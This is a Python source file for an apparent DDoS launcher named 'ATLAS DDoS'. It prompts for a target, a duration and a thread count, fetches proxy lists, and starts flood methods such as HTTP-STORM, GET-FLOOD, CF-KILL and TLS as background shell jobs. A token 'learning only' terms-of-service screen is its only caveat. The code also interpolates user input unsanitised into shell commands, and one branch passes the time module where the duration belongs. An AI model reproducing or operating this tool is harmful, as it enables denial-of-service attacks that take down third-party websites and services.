import os
import sys
import time
from subprocess import run
from time import sleep
from shutil import which

try:
	requests = __import__("httpx")
	from colorama import Fore, Back, Style
	from rich.console import Console
except Exception:
	exit("[X] Error? try this pip3 install requirements.txt")

console = Console()
tasks = [f"task {n}" for n in range(1, 3)]
with console.status("[bold green]Finding missing on files...") as status:
	while tasks:
		task = tasks.pop(0)
		sleep(1)
		console.log(f"{task} complete")
		try:
			with open("key.txt"):
				open("requirements.txt")
				open("install.sh")
				print("[X] All files Scanned Completed!")
		except IOError:
			exit("[X] Some files does not exist, Please install again!")


def getproxy() -> None:
	print("[+] Please wait...")
	with open("proxy_providers.txt", mode="r") as readurl:
		for url in readurl:
			url = url.strip()
			with open("proxy.txt", mode="a") as file:
				try:
					file.write(requests.get(url, timeout=1000).text)
				except requests.ConnectError:
					exit("[X] Connection Error")
				except KeyboardInterrupt:
					exit()
		print("[+] Attack Sent Successfully!!")
		print("[+] Type 'STOP' to stop your Attack.")


def OSclear():
	os.system('clear' if os.name == 'posix' else 'cls')


def unavail():
	print("""
╔════════════════════════════════════════════════════════════════════════╗
║            SORRY THE METHOD YOU ARE TRYING IS UNAVAILABLE              ║           
╚════════════════════════════════════════════════════════════════════════╝
    """)
 
def tos():
	print("""\033[1;31;40m
╔════════════════════════════════════════════════════════════════════════╗
║                            \033[2;30;42mTERMS OF SERVICE\033[1;31;40m                            ║
╠════════════════════════════════════════════════════════════════════════╣
║ FROM ADMIN:                                                            ║
║ Hàng Free Không Được Bán.                                              ║
║ Không Được Tấn Công Các Website Của Chính Phủ,                         ║ 
║ Chỉ Mang Mục Đích Học Tập                                              ║  
║ Chỉ Khỏe Cho Người Biết Sử Dụng                                        ║ 
║ Đừng Cầm Đi E Dít Giật Giật Nhé.                                       ║
╚════════════════════════════════════════════════════════════════════════╝

    """)
	while 1:
		accept = input("Do you agree in our TOS [Y/N]: ")
		if accept in ["y", "Y", "yes", "YES"]:
			sleep(2)
			print("[X] Proceeding...")
			menu()
		elif accept in ["n", "N", "no", "NO"]:
			sleep(2)
			exit("GOODBYE")
		elif accept in "":
			pass
		else:
			OSclear()
			tos()


def banner():
	print("""\033[1;32;40m
    \033[1;31;40m-- [ \033[2;30;42mCONNECTION ESTABLISHED\033[1;31;40m ] --\033[1;32;40m
         ╔═══╦════╦╗──╔═══╦═══╗
         ║╔═╗║╔╗╔╗║║──║╔═╗║╔═╗║
         ║║─║╠╝║║╚╣║──║║─║║╚══╗
         ║╚═╝║─║║─║║─╔╣╚═╝╠══╗║
         ║╔═╗║─║║─║╚═╝║╔═╗║╚═╝║
         ╚╝─╚╝─╚╝─╚═══╩╝─╚╩═══╝ Update V2\033[1;31;40m
     \033[1;32;40mANONPRIXOR \033[1;31;40m & \033[1;32;40mF34RL3SS \033[1;31;40m & \033[1;32;40mAYA \033[1;31;40m\033[1;31;40m & \033[1;32;40mViDucHung \033[1;31;40m 
      Type dev to see who develop
    """)

def repeater():
	while 1:
		repeat = input("[Atlas Bot] Do you want to go back to menu? [Y/N]: ")
		if repeat in ["y", "Y", "yes", "YES"]:
			sleep(2)
			print("[X] Proceeding...")
			menu()
		elif repeat in ["n", "N", "no", "NO"]:
			exit()
		elif repeat in "":
			pass
		else:
			OSclear()
			menu()


def menu():
	OSclear()
	banner()
	print("""
╔════════════════════════════════════════════════════════════╗
║    [1] USER INFO \033[1;32;40m[See user info, VIP or NON-VIP]\033[1;31;40m           ║
║    [2] METHODS \033[1;32;40m[View Methods]\033[1;31;40m                              ║
║    [3] FILE UPDATE \033[1;32;40m[You can see new updates in our Files]  \033[1;31;40m║
╚════════════════════════════════════════════════════════════╝

    """)
	while 1:
		choose1 = input("atlas-api@free@#~> ")
		if choose1 in ["1", "user", "userinfo", "info"]:
			userinfo()
		elif choose1 in ["2", "methods", "METHODS"]:
			launchflood()
		elif choose1 in ["3", "fileupdate", "update"]:
			fileupdate()
		elif choose1 in ["dev", "developer"]:
			developer()
		elif (choose1 == ""):
			pass

def userinfo():
    OSclear()
    print("""
╔════════════════════════════════════════════════════════════╗
║     USER TYPE: \033[1;32;40mFREE-USER        \033[1;31;40m                           ║
║     ADMIN PERM: \033[1;32;40mNO PERMISSION     \033[1;31;40m                         ║
║     ATTACK TIME: \033[1;32;40mUNLIMITED       \033[1;31;40m                          ║
║     USER EXPIRATION: \033[1;32;40mJanuary 1, 2038    \033[1;31;40m                   ║
║     METHODS ACCESS: \033[1;32;40mTRUE              \033[1;31;40m                     ║
╚════════════════════════════════════════════════════════════╝
    """)
    repeater()

def methodbanner():
	print("""
                          
                          [1;36m ╔╦╗ ┌─┐┌┬┐┬ ┬┌─┐┌┬┐┌─┐
                           [1;36m║║║ ├┤  │ ├─┤│ │ ││└─┐
                           [1;36m╩ ╩ └─┘ ┴ ┴ ┴└─┘─┴┘└─┘
                       [38;2;255;0;255mATLAS [1;36mDDoS,  [1;31mFree Methods DDoS.
                  [38;2;243;12;255m╚╦[38;2;237;18;255m════[38;2;231;24;255m════[38;2;225;30;255m═══[38;2;219;36;255m══[38;2;213;42;255m══[38;2;207;48;255m══[38;2;201;54;255m═[38;2;195;60;255m═[38;2;189;66;255m═[38;2;183;72;255m═[38;2;177;78;255m═[38;2;171;84;255m═[38;2;165;90;255m═[38;2;159;96;255m═[38;2;153;102;255m═[38;2;147;108;255m═[38;2;141;114;255m═[38;2;135;120;255m═[38;2;129;126;255m═[38;2;123;132;255m═[38;2;117;138;255m═[38;2;111;144;255m═[38;2;105;150;255m═[38;2;99;156;255m═[38;2;93;162;255m═[38;2;87;168;255m═[38;2;81;174;255m╦[38;2;75;180;255m╝
              [38;2;255;0;255m╔[38;2;249;6;255m═══[38;2;243;12;255m═╩[38;2;237;18;255m══[38;2;231;24;255m══[38;2;225;30;255m══[38;2;219;36;255m══[38;2;213;42;255m══[38;2;207;48;255m══[38;2;201;54;255m═[38;2;195;60;255m═[38;2;189;66;255m═[38;2;183;72;255m═[38;2;177;78;255m═[38;2;171;84;255m═[38;2;165;90;255m═[38;2;159;96;255m═[38;2;153;102;255m═[38;2;147;108;255m═[38;2;141;114;255m═[38;2;135;120;255m═[38;2;129;126;255m═[38;2;123;132;255m═[38;2;117;138;255m═[38;2;111;144;255m═[38;2;105;150;255m═[38;2;99;156;255m═[38;2;93;162;255m═[38;2;87;168;255m═[38;2;81;174;255m═════╩[38;2;75;180;255m═[38;2;69;186;255m═[38;2;63;192;255m═[38;2;57;198;255m═[38;2;51;204;255m╗
              [38;2;255;0;255m║ \033[1;4m\x1b[38;2;255;215;0mHTTP-STORM\033[0m  [38;2;213;42;255m╔╗  \033[1;4m\x1b[38;2;255;215;0mHTTP\033[0m         [38;2;135;120;255m╔[38;2;129;126;255m╗  \033[1;4m\x1b[38;2;255;215;0mHTTP-NULL\033[0m    [38;2;51;204;255m║
              [38;2;255;0;255m║ \033[1;4m\x1b[38;2;255;215;0mGET-FLOOD\033[0m   [38;2;213;42;255m║║  \033[1;4m\x1b[38;2;255;215;0mHTTP-SOCKET\033[0m  [38;2;135;120;255m║[38;2;129;126;255m║  \033[1;4m\x1b[38;2;255;215;0mCF-KILL\033[0m      [38;2;51;204;255m║
              [38;2;255;0;255m║ \033[1;4m\x1b[38;2;255;215;0mTLS\033[0m         [38;2;213;42;255m╚╝  \033[1;4m\x1b[38;2;255;215;0m\033[0m             [38;2;135;120;255m╚[38;2;129;126;255m╝  \033[1;4m\x1b[38;2;255;215;0m\033[0m             [38;2;51;204;255m║
              [38;2;255;0;255m╚[38;2;249;6;255m═════[38;2;243;12;255m════[38;2;237;18;255m═══[38;2;231;24;255m══[38;2;225;30;255m══[38;2;219;36;255m══[38;2;213;42;255m══[38;2;207;48;255m══[38;2;201;54;255m═[38;2;195;60;255m═[38;2;189;66;255m═[38;2;183;72;255m═[38;2;177;78;255m═[38;2;171;84;255m═[38;2;165;90;255m═[38;2;159;96;255m═[38;2;153;102;255m═[38;2;147;108;255m═[38;2;141;114;255m═[38;2;135;120;255m═[38;2;129;126;255m═[38;2;123;132;255m═[38;2;117;138;255m═[38;2;111;144;255m═[38;2;105;150;255m═[38;2;99;156;255m═[38;2;93;162;255m═[38;2;87;168;255m═[38;2;81;174;255m═[38;2;75;180;255m═[38;2;69;186;255m═[38;2;63;192;255m═[38;2;57;198;255m═[38;2;51;204;255m╝
     """)
  
def launchflood():
	OSclear()
	methodbanner()
	while 1:
		methods = input("[X] Choose Methods: ")
		if methods in ["HTTP-STORM", "http-storm"]:
			try:
				target = input("[X] Target: ")
				floodtime = int(input("[X] Time: "))
				thread = int(input("[X] Threads [5-10]: "))
				getproxy()
				run([f'screen -dm ./methods/ATLAS-METHODS {target} {floodtime} storm {thread}'], shell=True)
			except:
				print("Error try again")
		elif methods in ["HTTP", "http"]:
			try:
				target = input("[X] Target: ")
				floodtime = int(input("[X] Time: "))
				thread = int(input("[X] Threads [5-10]: "))
				getproxy()
				run([f'screen -dm ./methods/ATLAS-METHODS {target} {floodtime} proxy {thread}'], shell=True)
			except:
				print("Error try again")
		elif  methods in ["HTTP-NULL", "http-null"]:
			try:
				target = input("[X] Target: ")
				floodtime = int(input("[X] Time: "))
				thread = int(input("[X] Threads [5-10]: "))
				getproxy()
				run([f'screen -dm ./methods/ATLAS-METHODS {target} {floodtime} null-x {thread}'], shell=True)
			except:
				print("Error try again")
		elif  methods in ["CRINGE", "cringe"]:
			try:
				target = input("[X] Target: ")
				floodtime = int(input("[X] Time: "))
				getproxy()
				run([f'screen -dm node utils/cringe {target} {floodtime} 2'], shell=True)
			except:
				print("Error try again")
		elif  methods in ["GET-FLOOD", "get-flood"]:
			try:
				target = input("[X] Target: ")
				floodtime = int(input("[X] Time: "))
				getproxy()
				run([f'screen -dm node utils/https GET {target} utils/http.txt {floodtime} 64 1'], shell=True)
			except:
				print("Error try again")
		elif  methods in ["HTTP-SOCKET", "http-socket"]:
			try:
				target = input("[X] Target: ")
				floodtime = int(input("[X] Time: "))
				getproxy()
				run([f'screen -dm node utils/socket {target} utils/http.txt {floodtime} 200'], shell=True)
			except:
				print("Error try again")
		elif  methods in ["CF-KILL", "cf-kill"]:
			try:
				target = input("[X] Target: ")
				floodtime = int(input("[X] Time: "))
				getproxy()
				run([f'screen -dm node utils/cfkill {target} {floodtime} 1'], shell=True)
			except:
				print("Error try again")
		elif  methods in ["TLS", "tls"]:
			try:
				target = input("[X] Target: ")
				floodtime = int(input("[X] Time: "))
				getproxy()
				run([f'screen -dm node utils/tls.js {target} {time}'], shell=True)
			except:
				print("Error try again")
		elif methods in "":
			pass
		elif methods in ["clear", "CLEAR", "cls", "CLS"]:
			OSclear(); methodbanner()
		elif methods in ["stop", "STOP"]:
			run(["pkill screen"], shell=True)
			print("[+] Attack Stopped!")
		else:
		   print("[X] Invalid Method")


def fileupdate():
    OSclear()
    print("""
╔════════════════════════════════════════════════════════════╗
║     FILE VERSION: \033[1;32;40mV2 \033[1;31;40m                                      ║
║     LAST UPDATE: \033[1;32;40mDecember 4, 2022   \033[1;31;40m                       ║
║     NEXT UPDATE: \033[1;32;40mView on my GITHUB  \033[1;31;40m                       ║
╚════════════════════════════════════════════════════════════╝   
    """)
    repeater()

def developer():
    OSclear()
    print("""
╔════════════════════════════════════════════════════════════╗
║     DEVELOPER: ANONPRIXOR                                  ║
║     COMPILED SCRIPTS: F34RL3SS & AYA & ViDucHung           ║        
╚════════════════════════════════════════════════════════════╝

    """)
    repeater()

def main():
	print("[+] Checking Dependencies...\n")
	pkgs = ['screen']
	install = True
	for pkg in pkgs:
		ok = which(pkg)
		if ok == None:
			print(f"[X] {pkg} is not installed!\n")
			install = False
		else:
			pass
	if install == False:
		exit(f'[?] Error? try: sh install.sh')
	else:
		OSclear()
		tos()

if __name__ == "__main__":
	main()
